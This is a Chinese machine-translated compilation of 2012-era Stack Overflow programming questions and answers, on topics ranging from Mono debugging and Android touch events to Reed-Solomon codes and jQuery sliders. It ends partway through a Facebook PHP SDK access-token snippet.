作为 Mono 和 OSX 的新手，我不知道如何调试这个问题。即使我在调试器中运行，MonoDevelop 也不会中断，并且 C# 异常处理似乎没有任何帮助。有没有办法弄清楚发生了什么？现在看来，我可以保护我的程序的唯一方法是实际为 AppleScript 代码生成一个单独的进程。

我运行的脚本始终是相同的，并且 99% 的时间它运行时都没有问题。这是堆栈跟踪：

```
Stacktrace:

at (wrapper managed-to-native) MonoDevelop.MacInterop.AppleScript.OSACompile (MonoDevelop.MacInterop.ComponentInstance,MonoDevelop.MacInterop.AEDesc&,MonoDevelop.MacInterop.OsaMode,MonoDevelop.MacInterop.OsaId&) <IL 0x00028, 0xffffffff>
at MonoDevelop.MacInterop.AppleScript.Run (bool,MonoDevelop.MacInterop.AEDesc&,string&) [0x0007f] in /Users/kristian/Repositories/Kristian/projects/CherryTomato_NT/mono_osx/CherryTomato.Core_OSX/MacInterop/AppleScript.cs:131
at MonoDevelop.MacInterop.AppleScript.Run (bool,MonoDevelop.MacInterop.AEDesc&) [0x00000] in /Users/kristian/Repositories/Kristian/projects/CherryTomato_NT/mono_osx/CherryTomato.Core_OSX/MacInterop/AppleScript.cs:103
at MonoDevelop.MacInterop.AppleScript.Run (string) [0x00010] in /Users/kristian/Repositories/Kristian/projects/CherryTomato_NT/mono_osx/CherryTomato.Core_OSX/MacInterop/AppleScript.cs:83
... 
```

输出中还有很多其他信息，如有必要，我可以发布它们，但它看起来相当通用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:29:48.333

要调试本机崩溃 (SIGSEGV)，您需要使用 gdb（将 gdb 附加到您的程序 ( `gdb program #PID`)，运行它，当您点击 SIGSEGV 时，执行将停止）。

以下是在单声道中使用 gdb 的一些提示：[http](http://www.mono-project.com/Debugging#Debugging_with_GDB) ://www.mono-project.com/Debugging#Debugging_with_GDB （特别是您需要按照那里的说明创建 .gdbinit 文件）。

# .net - MonoMac NSTableView 和 NSTableViewDataSource 数据更新

> ID：11243261
> 
> 赞同：0
> 
> 时间：2012-06-28T11:04:49.697
> 
> 标签：.net, monomac

我试图在更新 NSTableViewDataSource 时更新 NSTableView。

NSTableViewDataSource 使用 ArrayList 并具有 Add() 和 Count() 方法，因此我的代码将从 Button Click 操作方法添加数据。

它类似于以下示例： http: [//www.netneurotic.de/Mono/MonoMac-NSTableView.html](http://www.netneurotic.de/Mono/MonoMac-NSTableView.html)

我想手动更新 TableView 而没有任何绑定。

我可以在 TableView 加载和工作时为其分配一个数据源，

但是，在更新新条目时，TableView 不会重新加载。

我看到了使用 TableView 绑定的 MonoMac 示例，但我不想走那条路。

我怎样才能让 TableView 更新它的列表？

编辑：真正的问题是我可以在不使用控制器的情况下完成这项工作吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T01:23:03.660

在您的控制器中，

```
 tableView.ReloadData(); 
```

# android - 在 Android 模拟器中拖动 mapView 时如何知道鼠标的 x、y 位置？

> ID：11243266
> 
> 赞同：0
> 
> 时间：2012-06-28T11:05:26.607
> 
> 标签：android

我现在实现的只是使用 onTouch(View v, MotionEvent event) 事件来获得第一次触摸。

但是我想知道当我连续拖动 mapView 时的 x,y 值。

如果有人知道答案，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:12:11.697

运动事件 ACTION_MOVE

[http://developer.android.com/reference/android/view/MotionEvent.html#ACTION_MOVE](http://developer.android.com/reference/android/view/MotionEvent.html#ACTION_MOVE)

[教程展示了如何使用它](http://www.tutorialforandroid.com/2009/06/drawing-with-canvas-in-android.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:34:04.547

它非常简单。这是一些代码，它返回触摸的 x 和 y 位置，然后返回一个角度以根据触摸位置旋转图像。

```
//TouchEvent handler
@Override
public boolean onTouchEvent(MotionEvent event) {
    Log.d(TAG, "onTouchEvent called...");
    x = event.getX();
    y = event.getY();

    switch (event.getAction()) {
    case MotionEvent.ACTION_MOVE:

        float dx = x - mPreviousX;
        float dy = y - mPreviousY;

        //Reverse direction of rotation if above midline
        if (y > getHeight() / 2) {
            dx = dx * -1;
        }

        //Reverse direction of rotation if of the midline
        if (y < getWidth() / 2) {
            dy = dy * -1;
        }

        Main.mAngle += (dx + dy) * TOUCH_SCALE_FACTOR;

        TextView txtView = (TextView) ((Activity)context).findViewById(R.id.mangle);
        txtView.setText("Angle: " + String.valueOf(Main.mAngle));

        requestRender();
    }

    mPreviousX = x;
    mPreviousY = y;

    return true;
} 
```

# forms - 在 JSP 中处理表单的元素

> ID：11243268
> 
> 赞同：0
> 
> 时间：2012-06-28T11:05:26.943
> 
> 标签：forms, jsp

我在 JSP 页面中有一个 HTML 表单，并且在我有一个 JavaScript 验证。用户必须输入一个字段：姓名或身份证或年份，Java 文件将按姓名或身份证或年份在数据库中搜索学生。JavaScript 在未填写任何字段时发出警报，并在填写一个字段时执行**操作**。

```
<html>
<head>
<title>Student to search into database</title>

<script language="javascript">
function validate2(objForm){

int k = 0;
if(objForm.name.value.length==0){
objForm.name.focus();
k++;
}

if(objForm.year.value.length==0){
objForm.year.focus();
k++;
}

if(objForm.id.value.length==0){
objForm.year.focus();
k++;
}

if(k == 0){
return false;
}
return true;
}
</script>

</head>
<body bgcolor=#ADD8E6><center>

<form action="FoundStudents.jsp" method="post" name="entry2" onSubmit="validate2(this)">
<input type="hidden" value="list" name="seek_stud"> 
```

..................................................... .........................................................

问题是我想处理我在 FoundStudents.jsp 中收到的参数：如果我得到了那一年，我在 DB 中查看那一年的学生并显示所有学生的数据（在一个java文件）。我怎么能在 FoundStudents.Jsp 中做到这一点而不再次检查哪个字段被填充（我已经在**SearchStudent.jsp**的 JavaScript 中做到了）。我的意思是 FoundStudents.jsp 调用 java 文件中的一个方法进行搜索和显示。

我现在尝试使用**隐藏的输入**，但那是为了更多的形式。我只有1个。

**FoundStudent.jsp**

```
<%@page import="stud.diploma.students.StudentsManager"%>
<%@page import="stud.diploma.students.Student"%>
<%@page import="java.util.ArrayList"%>
<%@page import="stud.diploma.database.ConnectionsManager"%>

<%@ page language="java" import="java.sql.*, java.lang.*" %>

<%
Student search = null;
if(request.getParameter("seek_stud") != null){

//reading params from the SearchStudent form
String name = request.getParameter("name");
String year_prime = request.getParameter("year");
int year, id;

try{
year = Integer.parseInt(year_prime);
}catch(Exception e1){
year = 0; 
}

String id_prime = request.getParameter("id");
try{
id = Integer.parseInt("id");
}catch(Exception e2){
id = 0;
}

if(name.length() != 0){
search = StudentsManager.getInstance().studByName(name);
}

if(year > 0){
search = StudentsManager.getInstance().studByYear(year);
}

if(id > 0){
search = StudentsManager.getInstance().studById(id);
} 

if(search != null){
%>

<html>
<body bgcolor=#4AA02C>
<center>
<h2>Student's data</h2>
<table border="1" cellspacing="1" cellpadding="8" bgcolor= #EBDDE2> 
<tr>
<td bgcolor= #FF9966><b>ID</b></td>
<td bgcolor= #FF9966><b>Name</b></td>
<td bgcolor= #FF9966><b>Year</b></td>
</tr>
<tr>
<td><%= search.getId()%></td>
<td><%= search.getName()%></td>
<td><%= search.getYear()%></td>
</tr>
</table>
</center>
</body>
</html>
<%}else{%>

<%
String redirectURL = "MainMenu.html";
response.sendRedirect(redirectURL);
%>

<%}%>
<%}%> 
```

这个**FoundStudent.jsp**是用于工作的多个表单（使用隐藏输入）的版本。（javascript测试只是有点不同，我输入了我一开始的内容）

它仅按名称和年份进行搜索。没有按 ID 搜索（我这里有异常，`<td><%= search.getId()%></td>`我仍在尝试查看如何处理它。ID 是 AUTO_INCREMENT PRIMARY KEY）

像这样的行：`search = StudentsManager.getInstance().studByName(name);` **搜索**是一个学生类型的对象。（对象 Student 在 java 文件中创建）

**StudentsManager**是一个 java 类，它从 JSP 接收对其方法的调用。getInstance() 创建一个 StudentManager 的实例。方法**studByName(name)**从表单中接收参数**名称**并在数据库中搜索它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-01T14:09:53.093

所以我将（java）脚本更改为：

```
<script language="javascript">
            function validateSea(){
                if(document.entry2.name.value != ''){
                    return true;
                }

                else
                    if(document.entry2.year.value != ''){
                       return true;
                    }

                alert('Please fill one field.');
                return false;   
             }
          </script>

        </head> 
```

这是1种形式。我不确定我是否做对了，但在我接收表单参数的 FoundStudents.jsp 中，我测试：

```
if((request.getParameter("year") != null)||(request.getParameter("name") != null)){

        //reading params from the SearchStudent form
................} 
```

它以这种方式工作。

# c++ - 纠错码

> ID：11243272
> 
> 赞同：4
> 
> 时间：2012-06-28T11:05:45.883
> 
> 标签：c++, c, error-correction

我需要对短消息（100 到 200 位之间）使用纠错技术。可用于添加冗余位的空间限制为 20-50%。

我将不得不在 C/C++ 中实现编码和解码。因此，它需要开源或足够容易编程。（我过去在解码算法方面有过一些经验——它们太可怕了！）

任何人都可以建议使用合适的错误代码（带有相关参数）吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-28T11:13:12.430

看看 Reed Solomon 纠错。

[此处](http://www.drdobbs.com/cpp/reed-solomon-error-correction/184410107)提供了 C++ 中的示例实现。

如需不同的选项，请查看[此处](http://www.eccpage.com/)- 参见项目 #11

编辑：如果你想要一个商业图书馆 - [http://www.schifra.com/faq.html](http://www.schifra.com/faq.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-02-10T01:15:08.067

Reed-Solomon 编码器以 RS(CAPACITY,PAYLOAD) 的形式描述。容量始终为 2^SYMBOL-1，其中 SYMBOL 是每个 Reed-Solomon 符号中的位数。很多时候，这个 SYMBOL 大小是 8 位（一个普通字节）。它通常可以是 3 到 16 位之间的任何值。对于 8 位符号，Reed-Solomon 编码器将命名为 RS(255,PAYLOAD)。

PAYLOAD 是非奇偶校验符号的数量。如果您需要 4 个奇偶校验符号，则应指定 RS(255,251)。

为了有效地纠正数据块中的错误，您必须首先将数据打包为符号（位组，通常只有 8 位字节）。您的目标是尝试安排（如果可能）将任何错误聚集到尽可能少的符号中。

例如，如果平均每 8 位发生一次错误，则 8 位符号将不合适；几乎每个符号都会有错误！您可能会选择 4 位符号并使用 RS(15,11) 编解码器——一次最多可处理 11 个 4 位符号，每个块产生 4 个奇偶校验符号。符号大小越小，容量越低（例如，对于 4 位的符号大小，2^4-1 == 15 个符号容量）。

但通常，您会使用 8 位符号。如果您有更实际的错误率，例如 10% 的 8 位符号是错误的，那么您可以使用 RS(255,205)——每 255 个符号 Reed-Solomon“码字”有 50 个奇偶校验符号，最大205 字节的有效负载。这给了我们约 25% 的奇偶性，使我们能够纠正包含高达约 12.5% 错误的码字。

使用[https://github.com/pjkundert/ezpwd-reed-solomon](https://github.com/pjkundert/ezpwd-reed-solomon)的 c++/ezpwd/rs Reed-Solomon API，您可以将其指定为：

```
#include <ezpwd/rs>
...
ezpwd::RS<255,205> rscodec; 
```

将您的数据放入 std::string （它可以很好地处理原始 8 位二进制数据）或 std::vector 并调用 API，添加 50 个奇偶校验符号：

```
std::string data;
// ... fill data with a fixed size block, up to 205 bytes
rscodec.encode( data ); 
```

发送您的数据，稍后，在您收到数据+奇偶校验后，恢复原始数据（并丢弃 50 个奇偶校验符号）：

```
int corrected = rscodec.decode( data ); 
```

如果数据可以恢复，将返回纠正的符号数，如果 Reed-Solomon 码字包含太多错误，则返回 -1。

享受！

# android - 加载 Flash 网站时，Android Webview 滚动行为异常

> ID：11243273
> 
> 赞同：4
> 
> 时间：2012-06-28T11:05:48.603
> 
> 标签：android, flash, adobe, android-webview

我正在使用以下代码在我的 web 视图中打开一个简单的基于 Flash 的网站：

**Java 代码：**

```
package com.sample.webview;

import android.app.Activity;
import android.app.ProgressDialog;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;

public class SampleWebViewActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        final WebView webView = (WebView) findViewById(R.id.webview);

        final ProgressDialog progress = new ProgressDialog(this);
        progress.setMessage("loading");

        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setPluginsEnabled(true);
        webView.getSettings().setBuiltInZoomControls(true);

        webView.setWebViewClient(new WebViewClient() {

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                progress.show();
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                progress.dismiss();
            }
        });

        Button mButton = (Button) findViewById(R.id.button);
        mButton.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {   
    webView.loadUrl("http://www.fusioncharts.com/demos/features/#linkedcharts-for-easy-drill-down");
            }
        });   
    }
} 
```

主要.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <Button
        android:id="@+id/button"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_margin="5dp"
        android:text="Load URL" />

    <WebView
        android:id="@+id/webview"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:layout_margin="5dp" />

</LinearLayout> 
```

现在，当页面完全加载并且我试图向下滚动以查看其余内容时，webview 将出现在“加载 URL”按钮的顶部。检查屏幕截图：

![在此处输入图像描述](../Images/8b4df99dd6726eca3cf47f587de6dd4e.png)

虽然它应该看起来像：

![在此处输入图像描述](../Images/b7ced2984903829205dd6f115aa359f7.png)

请建议，我应该怎么做才能正常工作。

**编辑：我正在使用安装了最新版本的 Flash Player 和 Adob​​e Air 的 Galaxy Note(OSv2.3.5)。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-06T06:05:14.687

我也尝试过这些东西，但我认为唯一的解决方案是在你的 xml 中只使用一个 webview，所以，你没有其他本机控件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-06T07:31:07.587

这在Android上真的被打破了。如果您尝试使用顶部栏中的构建，它也会在闪光灯后面。我真的建议你远离（远离）闪光灯。在 google 群组和 stackoverflow 上有一些关于它的讨论，但都没有任何好的结果。我发现的唯一好建议是使用 flash 来覆盖其他 flash 组件 =/

# iphone - 导航视图不起作用首先单击

> ID：11243281
> 
> 赞同：0
> 
> 时间：2012-06-28T11:06:08.070
> 
> 标签：iphone, objective-c, xcode4

我有一个导航视图，当我点击时，我只显示行号。

在主视图中：

```
-(void) tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{

if (read == nil) {
    readNotice *aController = [[readNotice alloc]initWithNibName:@"readNotice" bundle:nil];
    self.read = aController;   
}

[read updateRowNumber:indexPath.row];

[[self navigationController] pushViewController:read animated:YES]; 
```

在我的`readNotice`课堂上：

```
-(void)updateRowNumber:(int)theindex {

rowNumber = theindex + 1;

message.text = [NSString stringWithFormat:@"row %i was clicked", rowNumber];

NSLog(@"view did load row = %d", rowNumber);

} 
```

readNotice.xib 只包含一个标签。

我第一次单击它会显示“标签”，但它在以下尝试中有效。

我想我需要初始化一些我错过的东西，但我找不到它。

先感谢您

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:30:13.070

我无法理解您为什么要使 read 变量....？用这个 ..

```
-(void) tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{

  readNotice *aController = [[readNotice alloc]initWithNibName:@"readNotice" bundle:nil];
  [self.navigationController pushViewController:aController  animated:YES];
  [aController updateRowNumber:indexPath.row];
} 
```

这可能会帮助你...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:07:57.130

采用 -

```
if (self.read == nil) {
    readNotice *aController = [[readNotice alloc]initWithNibName:@"readNotice" bundle:nil];
    self.read = aController;   

}
--------
---------

[[self navigationController] pushViewController:self.read animated:YES]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:33:35.437

试试这个，在 tableview:didSelectRowAtIndex 方法中，

```
 -(void) tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{

 if (read == nil) {
    readNotice *aController = [[readNotice alloc]initWithNibName:@"readNotice" bundle:nil];
    self.read = aController;   
 }

 read.index = indexPath.row;
 [[self navigationController] pushViewController:read animated:YES]; 
```

`readNotice`在as中创建一个实例变量

```
 @property(assign) int index;

     @synthesize index; 
```

在`readNotice`viewDidLoad 方法中，您只需调用`updateRowNumber`

```
 - (void)viewDidLoad 
 {
   [super viewDidLoad];
   [self updateRowNumber:index];
 } 
```

它将按您的预期显示数字

# jquery - 将播放按钮添加到 jQuery 滑块

> ID：11243283
> 
> 赞同：2
> 
> 时间：2012-06-28T11:06:16.917
> 
> 标签：jquery

我有以下代码，它工作得很好，但是我想给它添加一个播放和停止按钮。关于如何做到这一点的任何想法？

```
$(document).ready(function () {
   var slides = $(".slide").length;

   $("#slidesContainer").css("overflow", "hidden");

   (function () {
      for (i = 0; i < slides; i++) {
          var tabNumber = i + 1;
          $("#tabsstyle ul").append('<li><a href="#" rel="' + tabNumber + '"></a></li>')
      }
      $("#tabsstyle li a").bind("click", function () {
         $("#tabsstyle li a").removeClass("active");
         $(this).addClass("active");

         var tabNumber = "n" + $(this).attr("rel");
         $("div.slide").delay(200).fadeOut();
         $("#" + tabNumber).delay(200).fadeIn(600)
      })
   })()

   $('#tabsstyle ul li a:first').addClass('active'); // first tab selected on doucment ready    
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:26:28.597

我假设您想要的是一种开始和停止标签幻灯片的方式。这是一种方法。这是完全未经测试的，但应该让你朝着正确的方向前进：

```
var intervalId;
function playTabs() {
    intervalId = setInterval("cycleTabs()", 1000);
}
function stopTabs() {
    clearInterval(intervalId);
}
function cycleTabs() {
    var currentTab = $("#tabsstyle li a.active");
    // Find the index number of the current tab by finding its position within its parent
    var currentTabNumber = $(currentTab).parent().children().index(currentTab);
    var nextTabNumber = currentTabNumber + 1;
    // if we are on the last slide then go back to the start
    if (currentTabNumber + 1 == slides) {
        nextTabNumber = 0;
    }
    $(currentTab).removeClass("active");
    $("div.slide").delay(200).fadeOut();
    $("#" + nextTabNumber).addClass("active");
    $("#" + nextTabNumber).delay(200).fadeIn(600)
} 
```

现在只需让您的开始/停止按钮调用 playTabs() 或 stopTabs() 取决于您想要做什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T14:26:01.410

## *[jsBin 演示](http://jsbin.com/ibehur/)*

您只需要这个简化的 HTML：

```
<div id="slideshow">

   <div id="slidesContainer">     
     <div class="slide"><h2>Slide-1</h2></div>      
     <div class="slide"><h2>Slide-2</h2></div>      
     <div class="slide"><h2>Slide-3</h2></div>  
     <div class="slide"><h2>Slide-4</h2></div>    
     <div class="slide"><h2>Slide-5</h2></div>   
     <div class="slide"><h2>Slide-6</h2></div>            
  </div>
  <div id="tabsstyle">
     <ul></ul>
     <div id="play_pause"></div>
  </div> 
```

添加+修改的CSS：

```
#tabsstyle li {
    float:left;
    list-style-type:none;
}

#tabsstyle li, #play_pause{
    color:#999;
    cursor:pointer;
    background:#eee url(img/MenuIcon.png) no-repeat 0 0;
    display:block;
    width:35px;
    height:20px;
    text-align:center;
    padding:8px 0;
    margin: 0 10px;
    -webkit-border-radius:4px;
    border-radius:4px;
}

#tabsstyle li.active{
    background:#cf5 url(img/MenuIcon.png) no-repeat 0 -35px;
}

#play_pause{
    position:absolute;
    line-height:16px;
    font-weight:bold;
    right:0px;
} 
```

乐趣从这里开始：

```
var curr = 0;       // SET DESIRED START SLIDE
var delay = 2500;   // SET DELAY BETWEEN ANIMATIONS
var fadeTime = 700; // SET FADE TIME
var symb = [ '||' , '&#9658;' ]; // play-pause button symbols

// do not edit below this line :) //
var slides = $(".slide").length;
var inter;

$("#slidesContainer").css("overflow", "hidden");
$("#slidesContainer .slide").css('position','absolute').hide().eq(curr).show();

// CREATE BUTTONS /////////////////
for (i = 0; i < slides; i++){
    $("#tabsstyle ul").append('<li>'+(i+1)+'</li>');
}
$('#tabsstyle ul li').eq(curr).addClass('active'); // first tab selected on doucment ready   
// ////////////////////////////////

// OUR FUNCTIONS //////////////////  
function anim(){        
    $('#tabsstyle li').eq(curr).addClass("active").siblings().removeClass('active'); // Set active btn
    $('.slide').eq(curr).fadeIn(fadeTime).siblings().fadeOut(fadeTime); // Slides animation
}   
function stop(){
    clearInterval(interv);  // stop auto-animation
    interv = false;
    $("#play_pause").html( symb[1] );
}
function play(){
    interv = setInterval(function(){
        curr = (++curr % slides);
        anim();
    },delay+fadeTime);
    $("#play_pause").html( symb[0] );
}
// ///////////////////////////////

play(); // Start (at dom ready)

$("#tabsstyle").on("click", "li", function(){
    stop();                 // stop
    curr = $(this).index(); // set current slide
    anim();                 // Run 'anim' function to 'curr' slide
});
$("#play_pause").on("click", function(){
    var check= interv===false ? play() : stop();
}); 
```

# c# - 创建向导

> ID：11243285
> 
> 赞同：-5
> 
> 时间：2012-06-28T11:06:29.550
> 
> 标签：c#, winforms, wizard

我想使用 winforms 和 VS 2010 实现一个向导。

我有这个[教程](http://www.codeproject.com/Articles/120607/Simple-Wizard-for-WinForms)，但由于我是 Visual Studio 和 C# 的新手，所以我不太了解它。

有人可以帮我吗？

我的主要问题是我不知道在本教程中将列表放在哪里？

我应该将所有代码放在一个类中吗？还是一种form.cs？它是如何划分的？

问候

闪电侠

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:12:15.987

看起来您需要为向导的每个页面创建一个 UserControl（右键单击您的项目，新建...用户控件），并且您需要在您的 UserControl 上实现 IWizardPage。比您拥有一个单一表单的 WizardHost。

因此，要回答您的问题，您将为向导的每一页提供一个表单和一个用户控件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:11:01.547

这是一个简单的例子，使用分组框，并将它们全部设置为隐藏可见性，但只显示第一个，然后当您单击按钮时，您将第一个分组框的可见性设置为隐藏，并设置 2e 的可见性显示。

组框可以包含控件，这样您就不必显示或隐藏单个控件

# dojo - Dojo 订阅树节点选择

> ID：11243287
> 
> 赞同：-1
> 
> 时间：2012-06-28T11:06:34.653
> 
> 标签：dojo

我正在使用 Struts 2 dojo 插件来制作 html 树。它为树节点生成一些 dojo-html 代码

```
<div dojoType="struts:StrutsTreeNode"     id="2"    title="car"> 
```

我想通过这个处理树节点点击

```
<script language="JavaScript" type="text/javascript">
dojo.event.topic.subscribe("treeSelected", function treeNodeSelected(message) {

    dojo.io.bind({
        url: "<s:url value='../roseindia/objectsList2.action'/>?categoryId="+message.node.title,
        load: function(type, data, evt) {
            var divDisplay = dojo.byId("displayIt");
            divDisplay.innerHTML=data;
        },
        mimeType: "text/html"
    });

}); 
```

我可以将 title(car) 作为 message.node.title 传递。我需要传递 id 而不是标题，但不是属性 message.node.id。

如何在 JavaScript 函数中访问 id(of treenode)？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T12:54:04.357

哦，好吧，所以你在 0.4.3 dojo.version 中！？我不确定 API 在那个旧版本中是如何工作的，但是当前最简单的 api 挂钩是 onClick。

我记得，使用 tree.onClick 覆盖，您将获得`item`和`TreeNode`，两者都是项目引用您的商店 json 数据的对象，而 treenode 是当前单击的行（dijit Widget，这意味着您应该拥有 .getChildren、.domNode ETC）。

所以在代码方面，试试

```
<div dojoType="struts:StrutsTreeNode"     id="2"    title="car">
  <script type="dojo/method" event="onClick" args="item, treeNode">
     alert(treeNode.id);
     alert(treeNode.domNode.tagName);
     alert(treeNode.domNode.innerHTML.substr(0,30);
  </script>
</div> 
```

# python - 查找工具/脚本/子目录

> ID：11243291
> 
> 赞同：0
> 
> 时间：2012-06-28T11:06:39.757
> 
> 标签：python, linux, ubuntu

有谁知道我在 Ubuntu 上 哪里可以找到[这个文件？](http://coverage.livinglogic.de/Tools/scripts/diff.py.html)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-28T11:14:30.423

在我的机器上，它位于：

```
/usr/share/doc/python2.7/examples/Tools/scripts/diff.py 
```

但是，它会有所不同，具体取决于您的发行版以及您的最新情况。但是有一个非常方便的小工具叫做“定位”，你可以用它来快速找到你机器上的东西。

```
locate diff.py | grep Tools 
```

给我

```
/usr/share/doc/python2.7/examples/Tools/scripts/diff.py
/usr/share/doc/python2.7/examples/Tools/scripts/ndiff.py
/usr/share/doc/python3.1/examples/Tools/scripts/diff.py
/usr/share/doc/python3.1/examples/Tools/scripts/ndiff.py 
```

因为我安装了两个版本的 Python。我把它通过 grep，因为有时 locate 可以匹配很多。

如果您确定您的机器上有一个文件，但 locate 没有找到它，您可能需要以 root 身份使用“updatedb”命令更新您的数据库。所以，只要运行

```
sudo updatedb 
```

喝杯咖啡（如果您的机器速度慢/驱动器非常满，则可以喝两杯），然后再试一次。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:10:18.303

这个命令

```
 $ locate "Tools/scripts/diff.py" 
```

如果已安装，将找到文件的位置。这取决于`updatedb`命令定期生成的数据库（这通常作为 cron 作业运行，但也可以手动调用）

FWIW，我刚刚检查了我的 Ubuntu 安装（10.04LTS）并没有找到它。也许只有 Python 2.7+ 版本有这个（这个安装附带的默认版本仍然是 v2.6.5）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-02-24T09:07:35.910

对于不同的环境，我需要知道这一点，即运行 Amazon 系统映像 (AMI) 的 Linux。我通过“yum”安装了 Python 3.5，但使用 find/locate 等或任何其他包含它的“yum”包找不到工具/脚本目录。

所以最后我克隆了python源码树镜像：

```
git clone https://github.com/python-git/python python 
```

这会下载 Tools/scripts 文件夹，然后我将其移动到某个标准位置。我需要“脚本”中的“2to3”程序，这很有效。该 URL 上还有一个“克隆或下载”链接，如果 git 不可用，可以在其中以通常的方式下载包。

我找不到在 AMI Linux 上通过“yum”安装工具/脚本的简单方法，这仍然是我的偏好。

# android - 安排页面优先级

> ID：11243295
> 
> 赞同：-2
> 
> 时间：2012-06-28T11:06:58.643
> 
> 标签：android

我开始创建一个android应用程序。起初，我计划它是 5 页，我为第一页和其他页面编写了 Xml 和 java 代码。现在我意识到我犯了一个错误。第一页不能是第一页。方法; 在第一页之前应该有一个新页面。我为那个新页面编写了代码，但是当我运行项目时我看不到它。我应该怎么办？已经谢谢了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:23:11.427

您必须将活动添加到 AndroidManifest.xml

在那里，您可以通过设置 intent-filter 来指定哪个 Activity 应该是 Launch-Activity：

```
 <activity android:name="LaunchActivity">
            <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
        </activity> 
```

不过，请确保**只有**您的 Launchy Activity 具有该意图签名。

无意冒犯，但这是非常基本的知识，也许您应该在开始开发之前阅读一些教程？

# ruby-on-rails - Rails/multi_db - 将延迟作业读取发送到专用从站

> ID：11243296
> 
> 赞同：0
> 
> 时间：2012-06-28T11:07:03.037
> 
> 标签：ruby-on-rails, gem

我正在使用 rails 2.3.11，[multi_db](https://github.com/schoefmax/multi_db) gem 来处理复制和[延迟](https://github.com/collectiveidea/delayed_job)作业。

我希望来自delayed_jobs 的所有读取都将使用一个专用的从站，并且其他读取（来自应用程序）将转到其余的从站。

是否可以使用“开箱即用”的 multi_db 来做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T14:11:42.037

找到了一个简单的解决方案：由于delayed_jobs 运行在与应用程序不同的服务器上，我将在每台服务器上都有一个不同的database.yml 文件，每个服务器都有自己的奴隶。

# php - facebook SDK 3.1.1 Access_token 问题

> ID：11243300
> 
> 赞同：0
> 
> 时间：2012-06-28T11:07:18.177
> 
> 标签：php, facebook, facebook-php-sdk

我正在使用以下代码获取 access_token

```
 <?php
//include the Facebook PHP SDK
include_once 'facebook.php';

//instantiate the Facebook library with the APP ID and APP SECRET
$facebook = new Facebook(array(
    'appId' => 'REPLACE WITH APP ID',
    'secret' => 'REPLACE WITH APP SECRET',
    'cookie' => true
));

//Get the FB UID of the currently logged in user
$user = $facebook->getUser();

//if the user has already allowed the application, you'll be able to get his/her FB UID
if($user) {
    //start the session if needed
    if( session_id() ) {

    } else {
        session_start();
    }

    //do stuff when already logged in

    //get the user's access token
    $access_token = $facebook->getAccessToken();
    //check permissions list
    $permissions_list = $facebook->api(
        '/me/permissions',
        'GET',
        array(
            'access_token' => $access_token
        )
    );

    //check if the permissions we need have been allowed by the user
    //if not then redirect them again to facebook's permissions page
    $permissions_needed = array('publish_stream', 'read_stream', 'offline_access', 'manage_pages');
    foreach($permissions_needed as $perm) {
        if( !isset($permissions_list['data'][0][$perm]) || $permissions_list['data'][0][$perm] != 1 ) {
            $login_url_params = array(
                'scope' => 'publish_stream,read_stream,offline_access,manage_pages',
                'fbconnect' =>  1,
                'display'   =>  "page",
                'next' => 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']
            );
            $login_url = $facebook->getLoginUrl($login_url_params);
            header("Location: {$login_url}");
            exit();
        }
    }

    //if the user has allowed all the permissions we need,
    //get the information about the pages that he or she managers
    $accounts = $facebook->api(
        '/me/accounts',
        'GET',
        array(
            'access_token' => $access_token
        )
    );

    //save the information inside the session
    $_SESSION['access_token'] = $access_token;
    $_SESSION['accounts'] = $accounts['data'];
    //save the first page as the default active page
    $_SESSION['active'] = $accounts['data'][0];

    //redirect to manage.php
    header('Location: manage.php');
} else {
    //if not, let's redirect to the ALLOW page so we can get access
    //Create a login URL using the Facebook library's getLoginUrl() method
    $login_url_params = array(
        'scope' => 'publish_stream,read_stream,offline_access,manage_pages',
        'fbconnect' =>  1,
        'display'   =>  "page",
